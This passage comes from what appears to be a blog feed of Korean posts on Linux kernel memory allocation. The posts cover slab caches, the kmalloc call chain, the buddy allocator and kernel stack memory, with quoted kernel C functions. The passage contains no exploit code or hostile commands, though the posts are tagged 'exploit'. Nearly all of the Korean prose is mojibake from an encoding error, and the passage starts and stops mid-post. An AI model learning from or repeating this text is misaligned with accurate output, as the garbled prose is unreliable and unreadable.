ëŒ€í•œ ìŠ¬ë© ìºì‹œë“¤ì´ ì¡´ì¬í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ë‹¤ìŒê³¼ ê°™ì€ ìºì‹œë“¤ì´ ìŠ¬ë© ë©”ëª¨ë¦¬ë¥¼ ê´€ë¦¬í•˜ëŠ” ì£¼ì²´ì´ë‹¤. í•˜ë‚˜ì˜ ìŠ¬ë© ìºì‹œ(Slab Cache)ë‚´ì˜ ëª¨ë“  ë©”ëª¨ë¦¬ë“¤ì€ ë™ì¼í•œ ì‚¬ì´ì¦ˆë¡œ ì œê³µëœë‹¤ëŠ” ì‚¬ì‹¤ì„ ì•Œê³  ìˆì.</p><h3 id="ìŠ¬ë©-ì˜¤ë¸Œì íŠ¸-Slab-Object-ì™€-ìŠ¬ë©-í˜ì´ì§€-Slab-Page"><a href="#ìŠ¬ë©-ì˜¤ë¸Œì íŠ¸-Slab-Object-ì™€-ìŠ¬ë©-í˜ì´ì§€-Slab-Page" class="headerlink" title="ìŠ¬ë© ì˜¤ë¸Œì íŠ¸(Slab Object)ì™€ ìŠ¬ë© í˜ì´ì§€(Slab Page)"></a>ìŠ¬ë© ì˜¤ë¸Œì íŠ¸(Slab Object)ì™€ ìŠ¬ë© í˜ì´ì§€(Slab Page)</h3><p><img src="/img/slab_sample.PNG"></p><p>ìŠ¬ë© ì˜¤ë¸Œì íŠ¸(Slab Object)ë€ ìŠ¬ë© ìºì‹œê°€ ë¯¸ë¦¬ í™•ë³´í•´ ë†“ì€ ë©”ëª¨ë¦¬ë¥¼ ì˜ë¯¸í•˜ë©° ì´ëŸ¬í•œ ì˜¤ë¸Œì íŠ¸ë“¤ë¡œ êµ¬ì„±ëœ í˜ì´ì§€ë¥¼ ìŠ¬ë© í˜ì´ì§€(Slab Page)ë¼ê³  í•œë‹¤. ê²°ê³¼ì ìœ¼ë¡œ ìŠ¬ë© í˜ì´ì§€ ë˜í•œ í˜ì´ì§€ì´ë©° 4KBì˜ í¬ê¸°ë¥¼ ê°–ëŠ”ë‹¤. ìƒë‹¨ì˜ ê·¸ë¦¼ì„ í™•ì¸í•´ë³´ë©´ íŠ¹ì •í•œ í¬ê¸°ë¡œ ë¯¸ë¦¬ í™•ë³´í•´ ë†“ì€ ë©”ëª¨ë¦¬ê°€ ìŠ¬ë© ê°ì²´(Slab Object)ì„ì„ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©° í•´ë‹¹ ë©”ëª¨ë¦¬ê°€ ì‚¬ìš©ë˜ëŠ” ê²½ìš°ëŠ” Allocìœ¼ë¡œ ë§ˆí‚¹ë˜ì–´ ìˆìœ¼ë©° ì‚¬ìš©í•˜ì§€ ì•ŠëŠ” ê²½ìš°ëŠ” Freeë¡œ ë§ˆí‚¹ë˜ì–´ ìˆëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì´ëŸ¬í•œ ìŠ¬ë¦½ ê°ì²´ë“¤ì´ ëª¨ì—¬ì„œ ìŠ¬ë© í˜ì´ì§€ë¥¼ êµ¬ì„±í•˜ê³  ìˆìŒì„ ë³¼ ìˆ˜ ìˆë‹¤.</p><p>Freeëœ ìŠ¬ë© ê°ì²´ì˜ ê²½ìš°ëŠ” freelistë¼ëŠ” ë¦¬ìŠ¤íŠ¸ ìë£Œêµ¬ì¡°ë¡œ ê´€ë¦¬ë˜ë©° ì´ë¥¼ í†µí•´ í•´ë‹¹ ë©”ëª¨ë¦¬ì— ëŒ€í•´ ìš”ì²­ì´ ë“¤ì–´ì˜¬ ê²½ìš° ì´ë¥¼ í™•ì¸í•˜ì—¬ ìŠ¬ë© ê°ì²´ì˜ ì£¼ì†Œë¥¼ ë°˜í™˜í•  ìˆ˜ ìˆë‹¤.</p><h2 id="ì»¤ë„-ì½”ë“œ-ë¶„ì„"><a href="#ì»¤ë„-ì½”ë“œ-ë¶„ì„" class="headerlink" title="ì»¤ë„ ì½”ë“œ ë¶„ì„"></a>ì»¤ë„ ì½”ë“œ ë¶„ì„</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">static __always_inline void *kmalloc(size_t size, gfp_t flags)<br>&#123;<br>        if (__builtin_constant_p(size)) &#123;<br>#ifndef CONFIG_SLOB<br>                unsigned int index;<br>#endif<br>                if (size &gt; KMALLOC_MAX_CACHE_SIZE)<br>                        return kmalloc_large(size, flags);<br>#ifndef CONFIG_SLOB<br>                index = kmalloc_index(size);<br><br>                if (!index)<br>                        return ZERO_SIZE_PTR;<br><br>                return kmem_cache_alloc_trace(<br>                                kmalloc_caches[kmalloc_type(flags)][index],<br>                                flags, size);<br>#endif<br>        &#125;<br>        return __kmalloc(size, flags);<br>&#125;<br></code></pre></td></tr></table></figure><p>kmalloc í•¨ìˆ˜ë¥¼ í™•ì¸í•˜ë©´ ë‚´ë¶€ì ìœ¼ë¡œ kmem_cache_alloc_traceë¥¼ í˜¸ì¶œí•¨ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.<br><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">void *kmem_cache_alloc_trace(struct kmem_cache *s, gfp_t gfpflags, size_t size)<br>&#123;<br>void *ret = slab_alloc(s, gfpflags, _RET_IP_);<br>trace_kmalloc(_RET_IP_, ret, size, s-&gt;size, gfpflags);<br>kasan_kmalloc(s, ret, size, gfpflags);<br>return ret;<br>&#125;<br></code></pre></td></tr></table></figure><p>kmem_cache_alloc_trace í•¨ìˆ˜ëŠ” slab_allocí•¨ìˆ˜ì— kmem_cacheì™€ gfpflags, ì£¼ì†Œì¸ addressë¥¼ ì „ë‹¬í•¨ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.<br><br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">static __always_inline void *slab_alloc(struct kmem_cache *s,<br>gfp_t gfpflags, unsigned long addr)<br>&#123;<br>return slab_alloc_node(s, gfpflags, NUMA_NO_NODE, addr);<br>&#125;<br></code></pre></td></tr></table></figure><p>slab_alloc í•¨ìˆ˜ëŠ” slab_alloc_node í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•¨ì„ ì•Œìˆ˜ ìˆë‹¤.<br><br></p><p>slab_alloc_nodeì˜ ê²½ìš°ëŠ” ì½”ë“œì˜ ì¤‘ìš”í•œ ë¶€ë¶„ë§Œ ì˜¤ë””íŒ…í•˜ì—¬ ì‘ì„±í•˜ê² ë‹¤. slab_alloc_node í•¨ìˆ˜ëŠ” ë‹¤ìŒê³¼ ê°™ì€ ë¡œì§ì„ ì§„í–‰í•œë‹¤.</p><pre><code>STEP1. kmem_cache_cpu êµ¬ì¡°ì²´ë¡œ ê´€ë¦¬ë˜ëŠ” per-cpu ìŠ¬ëŸ½ ìºì‹œë¥¼ ë¡œë”©í•œë‹¤.STEP2. per-cpu ìŠ¬ë© ìºì‹œì˜ ì†ì„± ì¤‘ struct page íƒ€ì…ì¸ pageì— ì ‘ê·¼í•œë‹¤.STEP3. ìŠ¬ë© ì˜¤ë¸Œì íŠ¸ë¥¼ í• ë‹¹í•œë‹¤.    kmem_cache_cpu ì¤‘ freelistì— í•´ì œëœ ìŠ¬ë© ê°ì²´ê°€ ìˆëŠ” ê²½ìš°             í•´ë‹¹ ìŠ¬ë©ê°ì²´ë¥¼ ë°˜í™˜í•œë‹¤.    kmem_cache_cpu ì¤‘ freelistì— ì–´ë– í•œ ê°ì²´ë„ ì¡´ì¬í•˜ì§€ ì•ŠëŠ” ê²½ìš°              __slab_alloc() í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•˜ì—¬ ìƒˆë¡œìš´ ìŠ¬ë© í˜ì´ì§€ë¥¼ í• ë‹¹í•œë‹¤.             í• ë‹¹ëœ ìŠ¬ë© í˜ì´ì§€ì—ì„œì˜ ìŠ¬ë© ê°ì²´ë¥¼ ë°˜í™˜í•œë‹¤.</code></pre><h2 id="ìŠ¬ë©-Slab-ìŠ¬ëŸ½-Slob-ìŠ¬ë¡­-Slub"><a href="#ìŠ¬ë©-Slab-ìŠ¬ëŸ½-Slob-ìŠ¬ë¡­-Slub" class="headerlink" title="ìŠ¬ë©(Slab), ìŠ¬ëŸ½(Slob), ìŠ¬ë¡­(Slub)"></a>ìŠ¬ë©(Slab), ìŠ¬ëŸ½(Slob), ìŠ¬ë¡­(Slub)</h2><p>ìŠ¬ë©ê³¼ ìŠ¬ëŸ½ ìŠ¬ë¡­ì€ ëª¨ë‘ ë©”ëª¨ë¦¬ í• ë‹¹ìì´ë‹¤. ë©”ëª¨ë¦¬ë¥¼ ë¯¸ë¦¬ ë§Œë“¤ì–´ í• ë‹¹í•˜ëŠ” í˜•íƒœì˜ í° ì•„ì´ë””ì–´ì—ì„œëŠ” ë³€í™”ê°€ ì—†ìŒìœ¼ë¡œ ë™ì¼í•œ í˜•íƒœë¡œ ë³´ì•„ë„ ë¬´ë°©í•˜ë‹¤ê³  ì¡°ì‹¬ìŠ¤ëŸ½ê²Œ ì–˜ê¸°í•œë‹¤. í˜„ì¬ ê¸°ì¤€ìœ¼ë¡œëŠ” ê¸°ë³¸ í• ë‹¹ìë¡œ ìŠ¬ëŸ½(Slub)ì„ ì‚¬ìš©í•˜ê³  ìˆë‹¤. ìŠ¬ë¡­(Slob)ì˜ ê²½ìš°ëŠ” ì§€ì •í•œ ì‚¬ì´ì¦ˆ ë‚´ ê°ì²´ì˜ ë©”ëª¨ë¦¬ í• ë‹¹ì€ ëª¨ë‘ ì²˜ë¦¬í•˜ëŠ” ë©”ëª¨ë¦¬ í• ë‹¹ìë¼ê³  í•œë‹¤. ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•  ê²½ìš° ì†ë„ëŠ” ê°€ì¥ ëŠë¦¬ë‚˜ ë©”íƒ€ ë°ì´í„°ì™€ ê°™ì€ ë¶€ê°€ ì •ë³´ê°€ í•„ìš”í•˜ì§€ ì•Šì•„ ë©”ëª¨ë¦¬ ì†Œëª¨ê°€ ì ì–´ ì„ë² ë””ë“œì— ì ìš©ì´ ëœë‹¤ê³  í•œë‹¤.</p><h2 id="ê²°ë¡ "><a href="#ê²°ë¡ " class="headerlink" title="ê²°ë¡ "></a>ê²°ë¡ </h2><p>3í¸ì— ê±¸ì³ ë¦¬ëˆ…ìŠ¤ ì»¤ë„ì—ì„œì˜ ë©”ëª¨ë¦¬ í• ë‹¹ ë°©ì‹ì„ ì•Œì•„ë³´ì•˜ë‹¤. ë‹¤ìŒ í¸ì—ì„œëŠ” ì‹¤ì œ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ êµ¬í˜„í•˜ëŠ” ëª¨ë“ˆ í”„ë¡œê·¸ë˜ë°ì— ëŒ€í•´ì„œ ì§„í–‰í•´ë³´ë„ë¡ í•˜ê² ë‹¤.</p><h2 id="ì°¸ê³ "><a href="#ì°¸ê³ " class="headerlink" title="ì°¸ê³ "></a>ì°¸ê³ </h2><pre><code>b30w0lfë‹˜ì˜ ìš´ì˜ì²´ì œ(Operating System)http://egloos.zum.com/rousalome/v/10001242https://jiravvit.tistory.com/entry/linux-kernel-4-ìŠ¬ë©í• ë‹¹ì</code></pre>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>kaslr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Basic - (4) ì»¤ë„ì—ì„œì˜ ë©”ëª¨ë¦¬ í• ë‹¹ 2í¸</title>
    <link href="/2021/09/07/LinuxKernelBasic4/"/>
    <url>/2021/09/07/LinuxKernelBasic4/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Basic-4-ì»¤ë„ì—ì„œì˜-ë©”ëª¨ë¦¬-í• ë‹¹-2í¸"><a href="#Research-Linux-Kernel-Basic-4-ì»¤ë„ì—ì„œì˜-ë©”ëª¨ë¦¬-í• ë‹¹-2í¸" class="headerlink" title="[Research] Linux Kernel Basic - (4) ì»¤ë„ì—ì„œì˜ ë©”ëª¨ë¦¬ í• ë‹¹ 2í¸"></a>[Research] Linux Kernel Basic - (4) ì»¤ë„ì—ì„œì˜ ë©”ëª¨ë¦¬ í• ë‹¹ 2í¸</h2><p><img src="/img/penguinshot.png"></p><h2 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h2><p>í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” ë¦¬ëˆ…ìŠ¤ ì»¤ë„(Linux Kernel)ì—ì„œë„ ì—°ì‚°ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ì„œ ë°ì´í„°ê°€ ì €ì¥ë˜ì–´ì•¼ë§Œ í•˜ëŠ” ê³µê°„ì´ ìˆì–´ì•¼ í•œë‹¤. ì´ëŸ¬í•œ ê³µê°„ì˜ ì£¼ì²´ëŠ” ë©”ëª¨ë¦¬(memory)ì´ë©° ë¦¬ëˆ…ìŠ¤ ì»¤ë„(Linux Kernel)ì—ì„œì˜ ë©”ëª¨ë¦¬ì˜ í• ë‹¹ ë°©ì‹ì„ ì•Œì•„ë³¸ë‹¤. í¬ìŠ¤íŠ¸ ì‘ì„±ì— ì•ì„œ ì˜¤ëŠ˜ì˜ ë¯¸íŒ…ì—ì„œ ë°°ì› ë˜ ì´ì•¼ê¸° ì£¼ì œë¡œ ìë£Œì¡°ì‚¬ë¥¼ ì§„í–‰í•˜ë©° ì‘ì„±í•˜ë©° b30W0lfë‹˜ì€ ë§¤ìš° ì˜ ê°€ë¥´ì³ì£¼ì…¨ì§€ë§Œ ë¬´ì§€ì„± ì¹¨íŒ¬ì§€ ë‚˜ì˜ ë‘ë‡Œ ë•Œë¬¸ì— ì˜ëª»ëœ ë‚´ìš©ì´ ìˆì„ ìˆ˜ ìˆìŒì„ ë°íŒë‹¤.</p><h2 id="ë¦¬ëˆ…ìŠ¤-ì‹œìŠ¤í…œì—ì„œì˜-ë©”ëª¨ë¦¬-í• ë‹¹"><a href="#ë¦¬ëˆ…ìŠ¤-ì‹œìŠ¤í…œì—ì„œì˜-ë©”ëª¨ë¦¬-í• ë‹¹" class="headerlink" title="ë¦¬ëˆ…ìŠ¤ ì‹œìŠ¤í…œì—ì„œì˜ ë©”ëª¨ë¦¬ í• ë‹¹"></a>ë¦¬ëˆ…ìŠ¤ ì‹œìŠ¤í…œì—ì„œì˜ ë©”ëª¨ë¦¬ í• ë‹¹</h2><p>ì¼ë°˜ì ì¸ ë¦¬ëˆ…ìŠ¤ ì‹œìŠ¤í…œì˜ ê²½ìš°ëŠ” ë¬¼ë¦¬ì  ë©”ëª¨ë¦¬ë¥¼ ê°€ì§€ê³  ìˆìœ¼ë©° ì´ë¥¼ í”„ë¡œì„¸ìŠ¤ê°€ ì‚¬ìš©í•  ìˆ˜ ìˆë„ë¡ í˜ì´ì§€ì˜ ë‹¨ìœ„ë¡œ í• ë‹¹í•œë‹¤. í˜ì´ì§€ì˜ ê²½ìš°ëŠ” ì¼ë°˜ì ìœ¼ë¡œ 4KB(0x1000)ì˜ í¬ê¸°ë¥¼ ê°€ì§€ê³  ìˆë‹¤. ì´ëŠ” alloc_pages() í•¨ìˆ˜ë¥¼ ì´ìš©í•´ í• ë‹¹ë°›ì„ ìˆ˜ ìˆë‹¤. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">unsigned long __get_free_pages(gfp_t gfp_mask, unsigned int order)<br>&#123;<br>struct page *page;<br><br>page = alloc_pages(gfp_mask &amp; ~__GFP_HIGHMEM, order);<br>if (!page)<br>return 0;<br>return (unsigned long) page_address(page);<br>&#125;<br></code></pre></td></tr></table></figure><p>í•´ë‹¹ ì½”ë“œëŠ” /mm/page_alloc.cì—ì„œ í™•ì¸í•  ìˆ˜ ìˆë‹¤. í•´ë‹¹ ì½”ë“œ ë‚´ë¶€ì— Line5ì—ëŠ” alloc_pagesë¼ëŠ” í•¨ìˆ˜ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìœ¼ë©° ì´ëŠ” <u>ë¬¼ë¦¬ ë©”ëª¨ë¦¬ì—ì„œì˜ í˜ì´ì§€ë¥¼ í• ë‹¹ ë°›ëŠ” í•¨ìˆ˜</u>ì´ë‹¤. í•´ë‹¹ í•¨ìˆ˜ì˜ ê²½ìš° íŒŒë¼ë¯¸í„°ë¡œ gfp_maskì™€ orderë¥¼ ì „ë‹¬í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ 0ì„ ë„˜ê¸°ê²Œë  ê²½ìš° 0x1000(4096) ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹ë°›ê³  1ì„ ë„˜ê¸°ê²Œ ë  ê²½ìš° 0x2000(8192) ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹ë°›ê³  2ë¥¼ ë„˜ê¸°ê²Œ ë  ê²½ìš° 0x4000(16384)ë§Œí¼ì˜ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹ë°›ëŠ”ë‹¤. ì´ë¥¼ ì‚´í´ë³´ë©´ 2ì˜ ì œê³±ì˜ í˜•íƒœë¡œ í˜ì´ì§€ë¥¼ í• ë‹¹ë°›ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. ì™œ ë‹¤ìŒê³¼ ê°™ì€ í˜•íƒœë¡œ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹ë°›ì„ê¹Œ?</p><p><img src="/img/buddy_meme.PNG" alt="ì™€ì¹ ë²„ë””!"></p><p>ì´ëŠ” ìš´ì˜ì²´ì œ ìˆ˜ì—…ì—ì„œ ì–¸ê¸‰í•˜ì˜€ë˜ Buddy Memory Allocationê³¼ ê´€ë ¨ì´ ìˆë‹¤ê³  íŒë‹¨ëœë‹¤. ì›ì‹œì (primitive)ì¸ ë°©ë²•ì„ í†µí•´ì„œ ë©”ëª¨ë¦¬ë¥¼ í•„ìš”í•œ ê³µê°„ë§Œí¼ ì§€ì†ì ìœ¼ë¡œ í• ë‹¹í•œ í›„ ì´ë¥¼ ë” ì´ìƒ ì‚¬ìš©í•˜ì§€ ì•ŠëŠ”ë‹¤ê³  íŒë‹¨ë˜ì–´ í•´ì œí•  ê²½ìš° í•´ë‹¹ í”„ë¡œì„¸ìŠ¤ì˜ ë©”ëª¨ë¦¬ ë§Œí¼ì˜ ë¹ˆ ê³µê°„(Hole)ì´ ë°œìƒí•˜ë©° ì§€ì†ì ìœ¼ë¡œ ì´ëŸ¬í•œ í˜•íƒœë“¤ì´ ë‹¨í¸í™”ê°€ ì§„í–‰ëœë‹¤ë©´ ë¹ˆ ê³µê°„ì€ í•„ìš”í•œ ë©”ëª¨ë¦¬ í¬ê¸° ì´ìƒìœ¼ë¡œ ì¡´ì¬í•˜ë‚˜ ì ì¬ë  ìˆ˜ ì—†ëŠ” External Fragmentationì˜ ìƒí™©ì´ ë°œìƒí•œë‹¤.</p><p><img src="/img/buddy_sample.jpg" alt="Buddy Memory Allocator"></p><p>ì´ëŸ¬í•œ ë¬¸ì œì ì„ í•´ê²°í•˜ê¸° ìœ„í•œ ì—¬ëŸ¬ê°€ì§€ ë°©ë²•ì´ ìˆìœ¼ë‚˜ ì§€ì •ëœ í¬ê¸°ë¥¼ ì§ì„ ì§€ì–´ í• ë‹¹í•˜ê±°ë‚˜ í•´ì œí•˜ì—¬ ë‹¤ì‹œ í•©ì¹˜ëŠ” Buddy Memory Allocatorê°€ ìˆë‹¤. ì¼ë°˜ì ìœ¼ë¡œ í˜„ì¬ì˜ ì‹œìŠ¤í…œì˜ ëŒ€ë‹¤ìˆ˜ëŠ” Buddy Memory Allocator í˜•íƒœë¡œ ë©”ëª¨ë¦¬ ê´€ë¦¬ë¥¼ ì§„í–‰í•œë‹¤. ì´ëŠ” ìƒë‹¨ì˜ ê·¸ë¦¼ì„ í™•ì¸í•˜ë©´ ë³´ë‹¤ ì§ê´€ì ìœ¼ë¡œ ì´í•´í•  ìˆ˜ ìˆë‹¤. </p><p>ë‹¤ìŒì˜ ê²½ìš°ëŠ” í˜ì´ì§€ì˜ ë‹¨ìœ„(4KB)ë¥¼ ê¸°ì¤€ìœ¼ë¡œ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•˜ê¸°ì— ëŒ€ìš©ëŸ‰ì˜ ë²„í¼ë¥¼ ì‚¬ìš©í•˜ëŠ” ê²½ìš°ë‚˜ ë©”ëª¨ë¦¬ í’€ì„ ê´€ë¦¬í•˜ëŠ” ê²½ìš°ì—ëŠ” ë‹¤ìŒê³¼ ê°™ì€ í˜•íƒœë¡œ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•œë‹¤.</p><h2 id="ê²°ë¡ "><a href="#ê²°ë¡ " class="headerlink" title="ê²°ë¡ "></a>ê²°ë¡ </h2><p>ë‹¤ìŒì€ í˜ì´ì§€ ë‹¨ìœ„ë¡œ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•˜ëŠ” ë¦¬ëˆ…ìŠ¤ ì‹œìŠ¤í…œì„ í™•ì¸í•˜ì˜€ê³ , ì„œë¡œ ì§ì„ ì§€ì–´ ë¶„í• í•˜ê±°ë‚˜ í•©ì³ì„œ ë©”ëª¨ë¦¬ë¥¼ í•´ì œí•˜ëŠ” í˜•íƒœì˜ Buddy System Allocationì„ í™•ì¸í•˜ì˜€ë‹¤. ê·¸ë ‡ë‹¤ë©´ ëŒ€ìš©ëŸ‰ì˜ ë²„í¼ê°€ ì•„ë‹Œ ì»¤ë„ì—ì„œì˜ êµ¬ì¡°ì²´ì˜ ì •ë³´ë¥¼ ë‹´ê¸° ìœ„í•œ ì‘ì€ ì‚¬ì´ì¦ˆ(16Byte, 32Byte, â€¦)ë“±ì˜ ë©”ëª¨ë¦¬ë¥¼ í• ë‹¹í•˜ê¸° ìœ„í•´ì„œëŠ” ì–´ë– í•œ ê¸°ë²•ì´ ì ìš©ë˜ì–´ ìˆëŠ” ì§€ ë‹¤ìŒ í¬ìŠ¤íŠ¸ì—ì„œ í™•ì¸í•´ë³´ê² ë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>exploit</tag>
      
      <tag>linux</tag>
      
      <tag>kernel</tag>
      
      <tag>mitigation</tag>
      
      <tag>kaslr</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Linux Kernel Basic - (3) ì»¤ë„ì—ì„œì˜ ë©”ëª¨ë¦¬ í• ë‹¹ 1í¸</title>
    <link href="/2021/09/06/LinuxKernelBasic3/"/>
    <url>/2021/09/06/LinuxKernelBasic3/</url>
    
    <content type="html"><![CDATA[<h2 id="Research-Linux-Kernel-Basic-3-ì»¤ë„ì—ì„œì˜-ë©”ëª¨ë¦¬-í• ë‹¹-1í¸"><a href="#Research-Linux-Kernel-Basic-3-ì»¤ë„ì—ì„œì˜-ë©”ëª¨ë¦¬-í• ë‹¹-1í¸" class="headerlink" title="[Research] Linux Kernel Basic - (3) ì»¤ë„ì—ì„œì˜ ë©”ëª¨ë¦¬ í• ë‹¹ 1í¸"></a>[Research] Linux Kernel Basic - (3) ì»¤ë„ì—ì„œì˜ ë©”ëª¨ë¦¬ í• ë‹¹ 1í¸</h2><p><img src="/img/penguinshot.png"></p><h2 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h2><p>í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” ë¦¬ëˆ…ìŠ¤ ì»¤ë„(Linux Kernel)ì—ì„œë„ ì—°ì‚°ì„ ìˆ˜í–‰í•˜ê¸° ìœ„í•´ì„œ ë°ì´í„°ê°€ ì €ì¥ë˜ì–´ì•¼ë§Œ í•˜ëŠ” ê³µê°„ì´ ìˆì–´ì•¼ í•œë‹¤. ì´ëŸ¬í•œ ê³µê°„ì˜ ì£¼ì²´ëŠ” ë©”ëª¨ë¦¬(memory)ì´ë©° ë¦¬ëˆ…ìŠ¤ ì»¤ë„(Linux Kernel)ì—ì„œì˜ ë©”ëª¨ë¦¬ì˜ í• ë‹¹ ë°©ì‹ì„ ì•Œì•„ë³¸ë‹¤.</p><h2 id="ì •ì -ë©”ëª¨ë¦¬"><a href="#ì •ì -ë©”ëª¨ë¦¬" class="headerlink" title="ì •ì  ë©”ëª¨ë¦¬"></a>ì •ì  ë©”ëª¨ë¦¬</h2><p>ì»¤ë„ì—ì„œì˜ ì •ì  ë©”ëª¨ë¦¬ í• ë‹¹ì— ëŒ€í•˜ì—¬ êµ¬ì²´ì ìœ¼ë¡œ ì•Œì•„ë³´ë ¤ê³  í•œë‹¤. ìœ ì € ê³µê°„ì˜ í• ë‹¹ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ ì •ì  ë©”ëª¨ë¦¬ í• ë‹¹ì€ íŠ¹ì§•ì„ ì§€ë‹Œë‹¤.</p></br><pre><code>1. í•¨ìˆ˜ í˜¸ì¶œ ì‹œ í•¨ìˆ˜ í”„ë¡¤ë¡œê·¸ì˜ ì ˆì°¨ë¥¼ í†µí•´ ìŠ¤íƒì— ê³µê°„ì„ í• ë‹¹í•œë‹¤.2. ìœ ì € ê³µê°„ê³¼ëŠ” ë³„ê°œì˜ ì»¤ë„ì˜ ìŠ¤íƒ ê³µê°„ì´ í• ë‹¹ëœë‹¤.3. ì»´íŒŒì¼ ì‹œ ìŠ¤íƒ ê³µê°„ì— ì–¼ë§ˆë§Œí¼ì˜ ë°ì´í„°ë¥¼ í™œìš©í•  ê²ƒì¸ì§€ì— ê´€í•´ ê²°ì •ëœë‹¤.4. í•¨ìˆ˜ í˜¸ì¶œ ì‹œ í•¨ìˆ˜ ì—í•„ë¡œê·¸ì˜ ì ˆì°¨ë¥¼ í†µí•´ ì •ì  ë©”ëª¨ë¦¬ëŠ” ìë™ìœ¼ë¡œ í•´ì œëœë‹¤.</code></pre><p>ìœ„ì˜ ê¸°ì¬ëœ ë‚´ìš©ì€ ì¼ë°˜ì ì¸ ìœ ì €ê³µê°„ì˜ ìŠ¤íƒê³µê°„ì˜ í• ë‹¹ê³¼ ë™ì¼í•´ë³´ì¸ë‹¤. ë¶€ê°€ì ì¸ ë‚´ìš©ì„ ë¶™íˆìë©´ ì»´íŒŒì¼ì„ í†µí•´ ìŠ¤íƒ í”„ë ˆì„ì˜ ìµœìƒìœ„ì—ì„œ subì—°ì‚°ì„ í†µí•´ ê³µê°„ì„ í™•ë³´í•˜ê³  í•¨ìˆ˜ í˜¸ì¶œì´ ì¢…ë£Œë˜ëŠ” ì‹œì ì—ì„œ ìŠ¤íƒ í”„ë ˆì„ì˜ ìµœìƒìœ„ì—ì„œ addì—°ì‚°ì„ í†µí•´ í”„ë ˆì„ì„ í•´ì œí•œë‹¤. ì´ í›„ í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ì–´ë„ ìŠ¤íƒ í¬ì¸í„°(frame pointer)ì™€ ë² ì´ìŠ¤ í¬ì¸í„°(base pointer)ë¥¼ ê¸°ì¤€ìœ¼ë¡œ ì ‘ê·¼í•˜ê¸°ì— ì¼ë°˜ì ì¸ ê²½ìš°ë¼ë©´ ë¬¸ì œ ë°œìƒì˜ ì†Œì§€ê°€ ì—†ë‹¤.</p></br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">void rt_mutex_setprio(struct task_struct *p, struct task_struct *pi_task) &#123;<br>    int prio, oldprio, queued, running, queue_flag =<br>        DEQUEUE_SAVE | DEQUEUE_MOVE | DEQUEUE_NOCLOCK;<br>    const struct sched_class *prev_class;<br>    struct rq_flags rf;<br>    struct rq *rq;<br><br>    prio = __rt_effective_prio(pi_task, p-&gt;normal_prio);<br>    ...<br></code></pre></td></tr></table></figure><p>ë‹¤ìŒì˜ ì½”ë“œë¥¼ í™•ì¸í•˜ë©´ 8ê°œì˜ ë³€ìˆ˜ë¥¼ í™œìš©í•˜ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆë‹¤.</p></br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 